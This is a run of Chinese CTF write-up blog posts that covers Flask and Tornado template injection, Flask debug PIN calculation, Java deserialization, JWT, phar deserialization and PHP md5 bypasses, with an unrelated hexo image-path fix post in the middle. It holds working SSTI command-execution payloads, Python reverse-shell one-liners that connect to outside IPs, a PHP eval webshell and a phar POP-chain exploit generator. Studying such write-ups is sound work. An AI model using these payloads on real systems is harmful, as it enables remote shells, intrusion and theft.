5.使用[‘o’+’s’],可绕过对os字符的过滤，访问http://192.168.100.161:62264/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(%22os%22).popen(%22ls%22).read()&apos;%20)%7D%7D查看flag文件所在 6.访问http://192.168.100.161:62264/%7B%7B%22%22.__class__.__mro__[2].__subclasses__()[40](%22fl4g%22).read()%7D%7D,可得到flag通用payload {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == &apos;catch_warnings&apos; %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if &apos;eval&apos; in b.keys() %} {{ b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&apos;) }} {% endif %} {% endif %} {% endfor %}{% endif %}{% endfor %} Flask开启debug模式Pin安全参考https://xz.aliyun.com/t/2553#toc-2代码 from flask import Flaskapp=Flask(__name__)@app.route(&apos;/&apos;)def hello_world(): return helloif __name__==&apos;__main__&apos;: app.debug = True app.run(host=&apos;0.0.0.0&apos;,port=8087) 运行会有一个pin值，每次不变，我这里是186-827-653,界面输入pin值获得权限payload先计算pin值 import hashlibfrom itertools import chainprobably_public_bits = [ &apos;root&apos;,# username &apos;flask.app&apos;,# modname &apos;Flask&apos;,# getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;)) &apos;/usr/local/lib/python3.5/dist-packages/flask/app.py&apos; # getattr(mod, &apos;__file__&apos;, None),]private_bits = [ &apos;95531326077&apos;,# str(uuid.getnode()), /sys/class/net/eth0/address-&gt;hex-&gt;dec 00:16:3e:1c:5a:7d0 &gt;95531326077 &apos;4de81b88ea87bb469a366a045ab870c1&apos;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&apos;utf-8&apos;) h.update(bit)h.update(b&apos;cookiesalt&apos;)cookie_name = &apos;__wzd&apos; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&apos;pinsalt&apos;) num = (&apos;%09d&apos; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &apos;-&apos;.join(num[x:x + group_size].rjust(group_size, &apos;0&apos;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 成功拿到服务器nc -vvlp 1234flask import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxxxxxxx&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]); python反弹shellpython3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.247.76.60&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.102.118.76&quot;,7778));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]); 题目easy_tornado模板注入2个hint一个是 /hints.txtmd5(cookie_secret+md5(filename)) 一个是 flag in /fllllllllllllag 我们要获得cookie_secret发现模板注入http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/error?msg=Errorhttp://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/error?msg={{1+1}}我们之后进行各种尝试与资料获取发现对于tornado框架存在附属文件handler.settingshttp://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/error?msg={{handler.settings}}获得{&apos;autoreload&apos;: True, &apos;compiled_template_cache&apos;: False, &apos;cookie_secret&apos;: &apos;c60b48df-5a65-4b5e-bf46-94c3536c65e6&apos;}所以得到http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/file?filename=/fllllllllllllag&amp;filehash=55e8b48b796a17f8ce4efa065aeec935flag{d9b60421-fffb-4eb1-9eb1-62e2c15be06c} [WesternCTF2018]shrine优秀的人写的wp都如此优秀，佩服佩服https://ctftime.org/writeup/10895 python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;","link":"2019/11/19/flask%E5%88%B0SSTI/"},{"title":"hexo-matery与hexo-asset-image冲突问题","text":"今天写博客的时候突然发生一件非常恶心的事情我个人用的是matery主题，然后图片用了hexo-asset-image插件一般来说流程是 配置_config.yml里面的post_asset_folder:false这个选项设置为true。 安装hexo-asset-image，运行hexo n “xxxx”来生成md博文时，/source/_posts文件夹内除了xxxx.md文件还有一个同名的文件夹，把图片放入该文件夹。 使用![](xxx.png)直接插入图片即可。 可真实情况是 生成图片的链接居然都变成了 /.io//1.png 重新hexo-clean,hexo-g也是一样的如下，太惨了 寻找解决办法网上说原因是: 由于hexo3版本后对很多插件支持有问题，hexo-asset-image插件在处理data.permalink链接时出现路径错误，把年月去掉了，导致最后生成的路径为%d/xxx/xxx需要对其做兼容处理。通过判断当前版本是否等于3的版本做不同的路径分割。反正和matery主题冲突了-我专门用了一个干净的环境也是一样的。 网上说改hexo-asset-image中的源码改来改去确一直不生效，你说气不气 我的办法这个插件中暑了，不如我们嗯嗯，卸载这个插件npm uninstall hexo-asset-image 看看会发生啥其实总的来说是正常的，只是url重复了，比如我在markdown中写![](hexo-matery与hexo-asset-image冲突问题/5.jpg)生成的url是/hexo-matery与hexo-asset-image冲突问题/hexo-matery与hexo-asset-image冲突问题/5.jpg!!!!居然重复了一遍纠结怎么改插件，不如把所有的![]({文件夹名}/x.jpg)改成![](x.jpg)，虽然预览很恶心，但是hexo生成后没问题 写脚本emm，终于觉得没白学python,一般我自己之前写了2中插入图片的语法，一种是![]({文件夹名}/x.jpg),一种是src=&quot;{文件夹啊名}/xx.jpg&quot;，所以通用脚本这样的 # -- coding:utf-8 import osimport re#filePath=&apos;C:/Users/38138/Desktop/1&apos;filePath=&apos;C:/blog/source/_posts&apos;count=1for file in os.listdir(filePath): #title=file[0:-3] print(file[-2:]) if file[-2:]==&apos;md&apos;: with open(os.path.join(filePath,file), &quot;r+&quot;,encoding=&apos;utf-8&apos;) as f: print(file) old = f.read() new_text=re.sub(&quot;!\\\\[[\\\\u4e00-\\\\u9fa5a-zA-Z0-9 \\\\-]*\\\\]\\\\([\\\\u4e00-\\\\u9fa5a-zA-Z0-9 \\\\-]*/&quot;,&quot;![](&quot;,old) new_text1=re.sub(&quot;src=\\&quot;[\\\\u4e00-\\\\u9fa5a-zA-Z\\\\-1-9 ]*/&quot;,&quot;src=\\&quot;&quot;,new_text) #print(new_text1) f.seek(0) f.truncate() f.write(new_text1) count+=1print(count) 改之前记得备份！！！！","link":"2019/11/19/hexo-matery%E4%B8%8Ehexo-asset-image%E5%86%B2%E7%AA%81%E9%97%AE%E9%A2%98/"},{"title":"JAVA2-反序列化和RMI","text":"java反序列化博客前面也记了很多php，python反序列化的内容，所以本文也就不再复述序列化反序列化的作用之类的，直奔主题-java的反序列化利用 Java 序列化是指把 Java 对象转换为字节序列的过程ObjectOutputStream类的 writeObject() 方法可以实现序列化Java 反序列化是指把字节序列恢复为 Java 对象的过程ObjectInputStream 类的 readObject() 方法用于反序列化。 java反序序列化例子 class User implements Serializable { private String name; public void setName(String name) { this.name=name; } public String getName() { return name; }}public class Helloworld{ public static void main(String[] args) throws Exception { User user=new User(); user.setName(&quot;st4ck&quot;); byte[] serializeData=serialize(user); FileOutputStream fout = new FileOutputStream(&quot;user.bin&quot;); fout.write(serializeData); fout.close(); User user2=(User) unserialize(serializeData); System.out.println(user2.getName()); } public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); } public static Object unserialize(final byte[] serialized) throws Exception { ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); return objIn.readObject(); }}//输出st4ck 直接将用户序列化了，然后反序列化我们可以查看生成的bin文件我们发现对于php的反序列化大部分是肉眼可读了，java的序列化的字节流确实不太友好。 修改readObject()方法，引发恶意代码执行 在进行反序列化时，java会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法 writeObject类同这就有点像php反序列化的魔法函数和python反序列化的__reduce__函数了我们可以尝试修改上面的user类，添加一个恶意函数，参数就为名字了，这样我们名字可以当作任意代码执行的参数比如calc.exe class User implements Serializable { private String name; public void setName(String name) { this.name=name; } public String getName() { return name; } private void readObject(java.io.ObjectInputStream stream) throws Exception { stream.defaultReadObject(); Runtime.getRuntime().exec(name); }}public class Helloworld{ public static void main(String[] args) throws Exception { User user=new User(); user.setName(&quot;calc.exe&quot;); byte[] serializeData=serialize(user); FileOutputStream fout = new FileOutputStream(&quot;user.bin&quot;); fout.write(serializeData); fout.close(); User user2=(User) unserialize(serializeData); System.out.println(user2.getName()); } public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); } public static Object unserialize(final byte[] serialized) throws Exception { ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); return objIn.readObject(); }} 如我们所愿当然java直接反序列化的情况太少了这个只能当基础，更多情况需要结合反射，rmi等机制 RMI介绍RMI(Remote Method Invocation)即Java远程方法调用，RMI用于构建分布式应用程序，RMI实现了Java程序之间跨JVM的远程通信。调用机制大概如下： RMI客户端在调用远程方法时会先创建Stub(sun.rmi.registry.RegistryImpl_Stub)。 Stub会将Remote对象传递给远程引用层(java.rmi.server.RemoteRef)并创建java.rmi.server.RemoteCall(远程调用)对象。 RemoteCall序列化RMI服务名称、Remote对象。 RMI客户端的远程引用层传输RemoteCall序列化后的请求信息通过Socket连接的方式传输到RMI服务端的远程引用层。 RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会请求传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)。 Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化。 Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端。 RMI客户端反序列化服务端结果，获取远程对象的引用。 RMI客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。 RMI客户端反序列化RMI远程方法调用结果。 rmi-demo通过rmi调用服务器读取flag的函数,（ps:好像是server不该是serve,英语tcl）代码https://github.com/Kit4y/rmi-demo/client/src/Client public class Client { public static void main(String[] args){ try { Registry registry= LocateRegistry.getRegistry(&quot;localhost&quot;, 8086); RmiTestInterface t=(RmiTestInterface) registry.lookup(&quot;test&quot;); System.out.println(&quot;Client:&quot;+t.getTest()); } catch (RemoteException e) { e.printStackTrace(); }catch (NotBoundException e) { e.printStackTrace(); } }} /client/src/RmiTestInterface和/serve/src/RmiTestInterface public interface RmiTestInterface extends Remote { public String getTest() throws RemoteException;} /serve/src/RmiTestImpl public class RmiTestImpl implements RmiTestInterface{ public RmiTestImpl() throws RemoteException { } public static void readToBuffer(StringBuffer buffer, String filePath) throws IOException { InputStream is = new FileInputStream(filePath); String line; // 用来保存每行读取的内容 BufferedReader reader = new BufferedReader(new InputStreamReader(is)); line = reader.readLine(); // 读取第一行 while (line != null) { // 如果 line 为空说明读完了 buffer.append(line); // 将读到的内容添加到 buffer 中 buffer.append(&quot;\\n&quot;); // 添加换行符 line = reader.readLine(); // 读取下一行 } reader.close(); is.close(); } @Override public String getTest() throws IOException { StringBuffer sb = new StringBuffer(); RmiTestImpl.readToBuffer(sb, &quot;C:\\\\Users\\\\38138\\\\Desktop\\\\rmi-demo\\\\serve\\\\src\\\\flag.txt&quot;); return sb.toString(); } public static void main(String[] args) throws RemoteException { RmiTestImpl t=new RmiTestImpl(); RmiTestInterface tt=(RmiTestInterface) UnicastRemoteObject.exportObject(t, 0); Registry registry= LocateRegistry.createRegistry(8086); registry.rebind(&quot;test&quot;, tt); System.out.println(&quot;server is start&quot;); }} 先运行RmiTestImpl，然后运行Client RMI引起的反序列化漏洞RMI通信中所有的对象都是通过Java序列化传输的既然RMI使用了反序列化机制来传输Remote对象，那么可以通过构建一个恶意的Remote对象，这个对象经过序列化后传输到服务器端，服务器端在反序列化时候就会触发反序列化漏洞。 RMI引起的反序列化漏洞-demo(待填坑)","link":"2020/05/25/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A82-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CRMI/"},{"title":"jwt","text":"jwtJson Web Token简称jwt，其实感觉和flask session很像https://kit4y.github.io/2019/11/19/flask-zhong-session-de-na-xie-shi/JWT一般的为三部分：header,payload,Signature而flask-session的三部分为json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息 jwt组成Header通常由两部分组成：令牌的类型，即JWT和正在使用的散列算法，如HMAC SHA256或RSA。 { &quot;alg&quot;:&quot;RS256&quot;, &quot;typ&quot;:&quot;JWT&quot;} alg为算法的缩写，typ为类型的缩写 然后，这个JSON被Base64编码，形成JSON Web Token的第一部分。 Payload令牌的第二部分是包含声明的有效负载。声明是关于实体（通常是用户）和其他元数据的声明。 这里是用户随意定义的数据 例如上面的举例 { &quot;name&quot;:&quot;adminsky&quot;, &quot;priv&quot;:&quot;other&quot;} 然后将有效载荷Base64进行编码以形成JSON Web Token的第二部分。 但是需要注意对于已签名的令牌，此信息尽管受到篡改保护，但任何人都可以阅读。除非加密，否则不要将秘密信息放在JWT的有效内容或标题元素中。 Signature要创建签名部分，必须采用header，payload，密钥 然后利用header中指定算法进行签名 例如HS256(HMAC SHA256),签名的构成为 HMACSHA256( base64Encode(header) + &quot;.&quot; + base64Encode(payload), secret) 然后将这部分base64编码形成JSON Web Token第三部分　　 这里采用的是私钥签名，公钥验证的方法。 在线工具https://jwt.io/http://jwt.calebb.net/ jwt密钥爆破工具https://github.com/brendan-rius/c-jwt-cracker使用方法 git clone https://github.com/brendan-rius/c-jwt-crackercd c-jwt-crackermake./c-jwt-cracker python3对jwt操作# -*- coding: utf-8 -*-import jwtdata = { &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;iat&quot;: 1516239022}# 加密 py3加密后是字节型数据encoded = jwt.encode(data, &apos;secret&apos;, algorithm=&apos;HS256&apos;)print(encoded.decode())# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ# 7m6JhjDj0Blnye6rLAat5mX0BCivb9XXuEY15LprW8cprint(jwt.decode(encoded, &apos;secret&apos;, algorithms=[&apos;HS256&apos;]))# {&apos;sub&apos;: &apos;1234567890&apos;, &apos;name&apos;: &apos;John Doe&apos;, &apos;iat&apos;: 1516239022}","link":"2020/01/01/jwt/"},{"title":"phar的利用姿势","text":"主要来说就2大利用，一个上传用phar伪协议绕过，一个是Phar反序列化漏洞 Phar的简述phar是什么?Phar归档最好的特点是可以方便地将多个文件组合成一个文件。因此，phar归档提供了一种方法，可以将完整的PHP应用程序分发到单个文件中，并从该文件运行它，而不需要将其提取到磁盘。此外，PHP可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上 利用姿势一、上传绕过使用Phar://伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们的压缩包（其实就是一个压缩包） hacktest.php &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; 然后将test.php压缩-&gt;test.zip改名-&gt;test.jpgindex.php &lt;?php include(&apos;phar://./test.jpg/test.php&apos;);?&gt; 成功包含（test.jpg为压缩包文件，后面的test.php为里面压缩包文件）其实和zip协议感觉上差不多 zip利用zip或phar伪协议可以读取压缩包中的文件，解压的压缩包与后缀无关。如将file.txt压缩成zip，改后缀为jpg绕过上传限制然后利用如下读取文件 /about.php?file=phar://./images/file.jpg/1.php/about.php?file=zip://./images/file.jpg%231.php 利用姿势二：Phar反序列化漏洞test:PS：php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。 [Phar]; http://php.net/phar.readonlyphar.readonly = Off 先新建一个php内容为 &lt;?php class Test{ public $test=&quot;test&quot;; } @unlink(&quot;test.phar&quot;); $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new Test(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 $phar-&gt;stopBuffering(); //签名自动计算?&gt; 访问后得到文件test.phar然后使用Phar://协议demo.php &lt;?phpclass Test{ function __destruct(){ echo $this-&gt;test; }}file_get_contents(&quot;phar://./test.phar/test.txt&quot;);?&gt;//输出test 这里的test.txt可以是任意字符除了file_get_contents，这些函数都可用 phar反序列化漏洞原理分析phar文件结构(参考上面test.phar的图)、stub 一个供phar扩展用于识别的标志，格式为xxx，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2、manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。3、contents 被压缩文件的内容。 4、signature 签名，放在文件末尾，格式如下： 发生反序列化原因在使用phar://协议读取文件时，文件会被解析成phar解析过程中会触发php_var_unserialize()函数对meta-data的操作，造成反序列化。一般情况下，利用Phar反序列漏洞有几个条件： 可以上传Phar文件有可以利用的魔术方法文件操作函数的参数可控 CISCN2019-Dropboxphar和pop链的利用姿势（参考[CISCN2019 华北赛区 Day1 Web1]Dropbox）地址：buuctf/dropbox这题套路差不多，也是phar触发的反序列化，每次比赛都有这样的题。。。这题没啥说的，主要是细心。随便注册个账号，直接登录进去，有三个功能：上传、下载、删除。肯定要试试任意下载，果然有一个。先试了passwd验证了之后想开始找目录，找了半天发现用../../index.php就行了。下载源码分析几个主要的文件，分别是class.php、download.php和delete.php。class.php &lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); }}class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = &apos;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&apos;; $table .= &apos;&lt;thead&gt;&lt;tr&gt;&apos;; foreach ($this-&gt;funcs as $func) { $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&apos; . htmlentities($func) . &apos;&lt;/th&gt;&apos;; } $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&apos;; $table .= &apos;&lt;/thead&gt;&lt;tbody&gt;&apos;; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= &apos;&lt;tr&gt;&apos;; foreach ($result as $func =&gt; $value) { $table .= &apos;&lt;td class=&quot;text-center&quot;&gt;&apos; . htmlentities($value) . &apos;&lt;/td&gt;&apos;; } $table .= &apos;&lt;td class=&quot;text-center&quot; filename=&quot;&apos; . htmlentities($filename) . &apos;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&apos;; $table .= &apos;&lt;/tr&gt;&apos;; } echo $table; }}class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(&apos; B&apos;, &apos; KB&apos;, &apos; MB&apos;, &apos; GB&apos;, &apos; TB&apos;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); }}?&gt; download.php &lt;?phpsession_start();if (!isset($_SESSION[&apos;login&apos;])) { header(&quot;Location: login.php&quot;); die();}if (!isset($_POST[&apos;filename&apos;])) { die();}include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&apos;sandbox&apos;]);$file = new File();$filename = (string) $_POST[&apos;filename&apos;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) { Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close();} else { echo &quot;File not exist&quot;;}?&gt; delete.php &lt;?phpsession_start();if (!isset($_SESSION[&apos;login&apos;])) { header(&quot;Location: login.php&quot;); die();}if (!isset($_POST[&apos;filename&apos;])) { die();}include &quot;class.php&quot;;chdir($_SESSION[&apos;sandbox&apos;]);$file = new File();$filename = (string) $_POST[&apos;filename&apos;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) { $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response);} else { Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response);}?&gt; 先找找有没有什么敏感函数，File类中open方法有file_exists可以触发phar的反序列化，close方法有file_get_contents可以读内容。所有就根据这两处找找利用链。最开始想到就是User类中的析构函数调用了db属性的close方法，可以把db赋值为一个File类，调用同名函数。但是这有个问题，读完了文件并没有回显的地方，所以这其实是个坑。再看看发现回显是在FileList中call方法给list赋值，然后destruct中打印。运行这个生成phar文件 &lt;?php class User { public $db; } class FileList { private $files; public function __construct(){ $this-&gt;files=array(new File()); } } class File{ public $filename = &quot;/flag.txt&quot;; } $o = new User(); $o-&gt;db =new FileList(); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); copy(&quot;phar.phar&quot;,&quot;test.gif&quot;)?&gt; 在删除的时候拿到flag解释：User-&gt;db是FileList类，Userdestruct时会调用db的close方法，因为FileList没有close方法所以触发call函数，call里面的逻辑就是再去调用$file的同名方法，$file是一个File类，所以就调用了File的close方法，读取了文件，存到FileList类的result中，destruct时候打印到页面。有了pop链然后就是找触发反序列化的点，看上去有三个参数可控点可以触发，分别是download.php中和delete.php中调用的File类的open方法，其中有file_exist函数。另外是delete.php中调用的File的delete方法，里面有unlink函数。但实际上unlink那里的没办法传参，参数是不可控的，只能通过open方法。而download中的open方法前面被open_basedir限制了路径，没办法利用。所以最后的触发点就是delete.php中的filename参数。上传伪装的phar文件test.gif，然后向delete.php用post发送filename=phar://test.gif就会在返回值中打印出flag #参考链接http://adm1n.design/2019/09/10/Ciscn%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Dropbox/https://xz.aliyun.com/t/2715","link":"2020/01/04/phar%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/"},{"title":"php中佛系的md5和数组","text":"1、MD5函数漏洞$_GET[&apos;name&apos;] != $_GET[&apos;password&apos;]MD5($_GET[&apos;name&apos;]) == MD5($_GET[&apos;password&apos;]) 要求满足上述条件则那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 以下值在md5加密后以0E开头： QNKCDZO240610708s878926199as155964671as214587387as214587387a 以下值在sha1加密后以0E开头： sha1(&apos;aaroZmOk&apos;)sha1(&apos;aaK1STfY&apos;)sha1(&apos;aaO8zKZF&apos;)sha1(&apos;aa3OFF9m&apos;) GET传入a=QNKCDZO&amp;b=240610708就能绕过了 2、php特性if($_POST[&apos;param1&apos;]!==$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;])){ die(&quot;success!&quot;); } 在php中===为完全等于运算，不仅比较值，而且还比较值的类型，只有两者一致才为真。再次使用a=QNKCDZO&amp;b=240610708就不行了，因为a和b类型不同。PHP中md5的函数特性 md5([1,2,3]) == md5([4,5,6]) == NULL[1] !== [2] &amp;&amp; md5([1]) === md5([2]) 所以GET传入a[]=1&amp;b[]=2就能够绕过了。 3、MD5碰撞if((string)$_POST[&apos;param1&apos;]!==(string)$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;])){ die(&quot;success!);} 要求构造param1和param2不同，但是MD5相同，也就是说要求传入两个MD5相同的不同字符串。使用fastcoll_v1.0.0.5.exe工具碰撞 Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 MD5值相同使用谷歌可以搜到相当多被巧妙构造出的二进制文件，其MD5相同，注意一点，post时一定要urlencode！！！建议使用burp编码 3.1、0e215962017md5(&quot;0e215962017&quot;)==0e291242476940776845150308577824md5后与自己弱相等 4、实战4.1、数组绕过md5和strcmpindex.php &lt;?phpif(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;])){ $v1 = $_GET[&apos;v1&apos;]; $v2 = $_GET[&apos;v2&apos;]; $v3 = $_GET[&apos;v3&apos;]; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){ if(!strcmp($v3, $flag)){ echo $flag; } }}?&gt; payload /index.php?v1[]=1&amp;v2[]=2&amp;v3[]=3 4.2、QNKCDZO碰撞&lt;?php$md51 = md5(&apos;QNKCDZO&apos;);$a = @$_GET[&apos;a&apos;];$md52 = @md5($a);if(isset($a)){if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) { echo &quot;nctf{*****************}&quot;;} else { echo &quot;false!!!&quot;;}}else{echo &quot;please input a&quot;;}?&gt; 